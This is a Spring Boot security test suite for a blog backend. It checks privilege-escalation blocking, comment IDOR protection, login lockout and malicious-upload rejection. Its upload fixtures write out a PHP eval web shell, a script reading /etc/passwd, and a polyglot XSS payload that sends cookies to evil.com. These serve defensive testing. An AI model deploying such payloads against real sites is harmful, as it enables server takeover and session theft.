package com.hayden.blog;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.hayden.blog.dto.CommentCreateRequest;
import com.hayden.blog.dto.LoginRequest;
import com.hayden.blog.dto.RegisterRequest;
import com.hayden.blog.entity.Comment;
import com.hayden.blog.entity.User;
import com.hayden.blog.security.CaptchaService;
import com.hayden.blog.security.JwtTokenProvider;
import com.hayden.blog.security.LoginAttemptService;
import com.hayden.blog.service.CommentService;
import com.hayden.blog.service.UserService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("h2")
public class AdversarialChallengeTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    @Autowired
    private JwtTokenProvider jwtTokenProvider;

    @Autowired
    private UserService userService;

    @Autowired
    private CommentService commentService;

    @Autowired
    private LoginAttemptService loginAttemptService;

    @Autowired
    private CaptchaService captchaService;

    @Value("${app.upload.dir:./uploads/}")
    private String uploadDir;

    private String readerToken;
    private String adminToken;

    @BeforeEach
    void setUp() {
        adminToken = "Bearer " + jwtTokenProvider.generateToken("admin", "ADMIN");
        readerToken = "Bearer " + jwtTokenProvider.generateToken("attacker_reader", "USER");

        try {
            RegisterRequest req = new RegisterRequest();
            req.setUsername("attacker_reader");
            req.setPassword("readerpass123");
            req.setNickname("攻击测试读者");
            req.setEmail("attacker@test.com");
            userService.register(req);
        } catch (Exception ignored) {
        }
    }

    // ==========================================
    // 对抗实测 1：普通读者持普通 JWT 尝试越权调用全量管理写接口
    // ==========================================
    @Test
    @DisplayName("【对抗实测1】模拟普通读者持普通用户JWT对所有管理写接口发起越权写请求，验证100%被拦截(403)")
    void testAdversarialVerticalPrivilegeEscalationOnAllAdminEndpoints() throws Exception {
        // 1. 文章管理写接口
        mockMvc.perform(post("/api/posts")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"title\":\"黑产文章\",\"slug\":\"hack-post\",\"content\":\"恶意内容\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(put("/api/posts/1")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"title\":\"篡改文章\",\"slug\":\"tamper-post\",\"content\":\"篡改内容\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(delete("/api/posts/1")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(patch("/api/posts/1/status?status=DRAFT")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(patch("/api/posts/1/featured?featured=1")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(get("/api/posts/admin")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 2. 分类管理写接口
        mockMvc.perform(post("/api/categories")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"name\":\"黑客分类\",\"slug\":\"hack-cat\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(put("/api/categories/1")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"name\":\"修改分类\",\"slug\":\"mod-cat\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(delete("/api/categories/1")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 3. 站点配置修改
        mockMvc.perform(put("/api/settings")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"siteName\":\"篡改博客名\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 4. 标签管理写接口
        mockMvc.perform(post("/api/tags")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"name\":\"恶意标签\",\"slug\":\"evil-tag\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(delete("/api/tags/1")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 5. 随记管理写接口
        mockMvc.perform(post("/api/memos")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"content\":\"恶意随记\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(delete("/api/memos/1")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 6. 友链管理写接口
        mockMvc.perform(post("/api/friends")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"name\":\"钓鱼网站\",\"url\":\"http://phishing.com\",\"description\":\"钓鱼\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(delete("/api/friends/1")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 7. 项目管理写接口
        mockMvc.perform(post("/api/projects")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"name\":\"恶意项目\",\"slug\":\"evil-proj\",\"description\":\"desc\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(delete("/api/projects/1")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 8. 足迹 Journey 写接口
        mockMvc.perform(post("/api/journey")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"title\":\"伪造足迹\",\"country\":\"中国\",\"city\":\"恶意城市\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(delete("/api/journey/1")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 9. 近况 Now 接口
        mockMvc.perform(put("/api/now")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"content\":\"篡改近况\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 10. 时间线 Timeline 写接口
        mockMvc.perform(post("/api/timeline")
                        .header("Authorization", readerToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"year\":\"2026\",\"title\":\"恶意时间线\"}"))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(delete("/api/timeline/1")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 11. 仪表盘敏感数据
        mockMvc.perform(get("/api/dashboard/stats")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 12. 媒体库写接口
        mockMvc.perform(delete("/api/media/1")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        // 13. 评论审核管理接口
        mockMvc.perform(get("/api/comments/admin")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));

        mockMvc.perform(patch("/api/comments/1/status?status=REJECTED")
                        .header("Authorization", readerToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));
    }

    // ==========================================
    // 对抗实测 2：读者 A 尝试删除读者 B 的评论 (BOLA / IDOR)
    // ==========================================
    @Test
    @DisplayName("【对抗实测2】模拟读者A尝试删除读者B的评论，验证被拦截返回HTTP 403且数据不被篡改")
    void testAdversarialHorizontalPrivilegeEscalationCommentDelete() throws Exception {
        // 创建读者 A (Alice) 与 读者 B (Bob)
        try {
            RegisterRequest reqAlice = new RegisterRequest();
            reqAlice.setUsername("alice_user");
            reqAlice.setPassword("alice123456");
            reqAlice.setNickname("读者爱丽丝");
            userService.register(reqAlice);
        } catch (Exception ignored) {}

        try {
            RegisterRequest reqBob = new RegisterRequest();
            reqBob.setUsername("bob_user");
            reqBob.setPassword("bob123456");
            reqBob.setNickname("读者鲍勃");
            userService.register(reqBob);
        } catch (Exception ignored) {}

        User alice = userService.getOne(new com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper<User>().eq(User::getUsername, "alice_user"));
        User bob = userService.getOne(new com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper<User>().eq(User::getUsername, "bob_user"));
        assertNotNull(alice);
        assertNotNull(bob);

        String aliceToken = "Bearer " + jwtTokenProvider.generateToken("alice_user", "USER");
        String bobToken = "Bearer " + jwtTokenProvider.generateToken("bob_user", "USER");

        // Bob 发表一条重要评论
        CommentCreateRequest commentReq = new CommentCreateRequest();
        commentReq.setTargetType("POST");
        commentReq.setTargetId(999L);
        commentReq.setContent("鲍勃的精彩评论内容");
        Long bobCommentId = commentService.createComment(commentReq, bob.getId());
        assertNotNull(bobCommentId);

        // 1. Alice 恶意尝试通过 DELETE /api/comments/{id} 删除 Bob 的评论
        mockMvc.perform(delete("/api/comments/" + bobCommentId)
                        .header("Authorization", aliceToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403))
                .andExpect(jsonPath("$.message").value("无权删除他人评论"));

        // 验证数据库中 Bob 的评论仍然完好存在！
        Comment commentAfterAttack = commentService.getById(bobCommentId);
        assertNotNull(commentAfterAttack, "受害者 Bob 的评论必须依然存留在数据库中");
        assertEquals("鲍勃的精彩评论内容", commentAfterAttack.getContent());

        // 2. 匿名未登录用户尝试删除 Bob 评论 -> 401
        mockMvc.perform(delete("/api/comments/" + bobCommentId))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.code").value(401));

        // 3. Bob 本人删除自己的评论 -> 成功 200
        mockMvc.perform(delete("/api/comments/" + bobCommentId)
                        .header("Authorization", bobToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.code").value(200));

        // 验证评论已被合法删除
        assertNull(commentService.getById(bobCommentId));
    }

    // ==========================================
    // 对抗实测 3：连续 5 次输错密码，验证第 5 次及后续立即锁定 15 分钟返回 429
    // ==========================================
    @Test
    @DisplayName("【对抗实测3】连续构造 5 次错误密码请求，验证第 5 次及后续请求立即触发 15 分钟 IP 锁定并返回 429")
    void testAdversarialBruteForceLockoutBehavior() throws Exception {
        final String attackIp = "198.51.100.77";
        final String victimUsername = "admin";

        loginAttemptService.reset(attackIp, victimUsername);

        LoginRequest wrongReq = new LoginRequest();
        wrongReq.setUsername(victimUsername);
        wrongReq.setPassword("totally_wrong_password");

        // 第 1 次输错 -> 401
        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(wrongReq)))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.code").value(401));

        // 第 2 次输错 -> 401
        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(wrongReq)))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.code").value(401));

        // 第 3 次输错 (提供合法验证码以进入密码判定) -> 401
        captchaService.storeCaptchaForTest("key-adv-3", "8888");
        wrongReq.setCaptchaKey("key-adv-3");
        wrongReq.setCaptchaCode("8888");
        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(wrongReq)))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.code").value(401));

        // 第 4 次输错 (提供合法验证码) -> 401
        captchaService.storeCaptchaForTest("key-adv-4", "8888");
        wrongReq.setCaptchaKey("key-adv-4");
        wrongReq.setCaptchaCode("8888");
        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(wrongReq)))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.code").value(401));

        // 第 5 次输错 -> 触发 15 分钟锁定，第 5 次响应直接返回 429！
        captchaService.storeCaptchaForTest("key-adv-5", "8888");
        wrongReq.setCaptchaKey("key-adv-5");
        wrongReq.setCaptchaCode("8888");
        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(wrongReq)))
                .andExpect(status().isTooManyRequests())
                .andExpect(jsonPath("$.code").value(429))
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("已被锁定15分钟")));

        // 第 6 次在锁定冷却期内尝试（即使密码完全正确！）-> 被第 1 道锁定防线直接打回 429
        LoginRequest rightReq = new LoginRequest();
        rightReq.setUsername(victimUsername);
        rightReq.setPassword("admin123");
        mockMvc.perform(post("/api/auth/login")
                        .header("X-Forwarded-For", attackIp)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(rightReq)))
                .andExpect(status().isTooManyRequests())
                .andExpect(jsonPath("$.code").value(429))
                .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("已被锁定15分钟")));

        // 清理现场
        loginAttemptService.reset(attackIp, victimUsername);
    }

    // ==========================================
    // 对抗实测 4：伪装成 .png 但内容为恶意脚本或伪造魔数的文件，验证拒绝落盘并返回 400
    // ==========================================
    @Test
    @DisplayName("【对抗实测4】伪装成 .png 的恶意脚本或伪造魔数文件，验证上传接口拒绝落盘并返回 400")
    void testAdversarialMaliciousFileUploadRejectionAndNoDiskWrite() throws Exception {
        Path uploadDirPath = Paths.get(uploadDir);
        long fileCountBefore = 0;
        if (Files.exists(uploadDirPath)) {
            try (Stream<Path> stream = Files.walk(uploadDirPath)) {
                fileCountBefore = stream.filter(Files::isRegularFile).count();
            }
        }

        // 攻击场景 A: 后缀为 .png，内容为纯文本脚本 (无魔数)
        MockMultipartFile attackA = new MockMultipartFile(
                "file",
                "malicious_script.png",
                "image/png",
                "echo 'pwned by challenger'; cat /etc/passwd".getBytes()
        );
        mockMvc.perform(multipart("/api/media/upload")
                        .file(attackA)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400))
                .andExpect(jsonPath("$.message").value("文件头魔数校验失败，仅支持真实 JPG, PNG, WEBP, GIF 图片"));

        // 攻击场景 B: 后缀为 .png，内容为 PHP WebShell 代码 (无魔数)
        MockMultipartFile attackB = new MockMultipartFile(
                "file",
                "webshell.png",
                "image/png",
                "<?php @eval($_POST['cmd']); ?>".getBytes()
        );
        mockMvc.perform(multipart("/api/media/upload")
                        .file(attackB)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400));

        // 攻击场景 C: 伪造 PNG 魔数 (89 50 4E 47 0D 0A 1A 0A) 但潜藏 XSS 脚本 (Polyglot 攻击)
        byte[] pngHeader = new byte[]{(byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A};
        byte[] xssPayload = "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>".getBytes();
        byte[] polyglotBytes = new byte[pngHeader.length + xssPayload.length];
        System.arraycopy(pngHeader, 0, polyglotBytes, 0, pngHeader.length);
        System.arraycopy(xssPayload, 0, polyglotBytes, pngHeader.length, xssPayload.length);

        MockMultipartFile attackC = new MockMultipartFile(
                "file",
                "polyglot_xss.png",
                "image/png",
                polyglotBytes
        );
        mockMvc.perform(multipart("/api/media/upload")
                        .file(attackC)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400))
                .andExpect(jsonPath("$.message").value("检测到非法脚本标签或恶意载荷，拒绝上传"));

        // 攻击场景 D: 伪造 PNG 魔数潜藏 SVG onload 脚本
        byte[] svgPayload = "<svg/onload=alert(1)>".getBytes();
        byte[] polyglotSvgBytes = new byte[pngHeader.length + svgPayload.length];
        System.arraycopy(pngHeader, 0, polyglotSvgBytes, 0, pngHeader.length);
        System.arraycopy(svgPayload, 0, polyglotSvgBytes, pngHeader.length, svgPayload.length);

        MockMultipartFile attackD = new MockMultipartFile(
                "file",
                "polyglot_svg.png",
                "image/png",
                polyglotSvgBytes
        );
        mockMvc.perform(multipart("/api/media/upload")
                        .file(attackD)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400))
                .andExpect(jsonPath("$.message").value("检测到非法脚本标签或恶意载荷，拒绝上传"));

        // 攻击场景 E: 极小畸形文件 (小于 4 字节)
        MockMultipartFile attackE = new MockMultipartFile(
                "file",
                "tiny.png",
                "image/png",
                new byte[]{(byte) 0x89, 0x50}
        );
        mockMvc.perform(multipart("/api/media/upload")
                        .file(attackE)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400))
                .andExpect(jsonPath("$.message").value("文件体积过小或损坏，无法识别合法图片魔数"));

        // 【实证核验核心】：检查磁盘 uploads 目录，确认以上 5 次恶意文件上传绝对没有任何落盘！
        long fileCountAfterAttacks = 0;
        if (Files.exists(uploadDirPath)) {
            try (Stream<Path> stream = Files.walk(uploadDirPath)) {
                fileCountAfterAttacks = stream.filter(Files::isRegularFile).count();
            }
        }
        assertEquals(fileCountBefore, fileCountAfterAttacks, "所有恶意文件上传均必须被拒绝落盘，上传目录文件数不应发生任何增加！");
    }
}
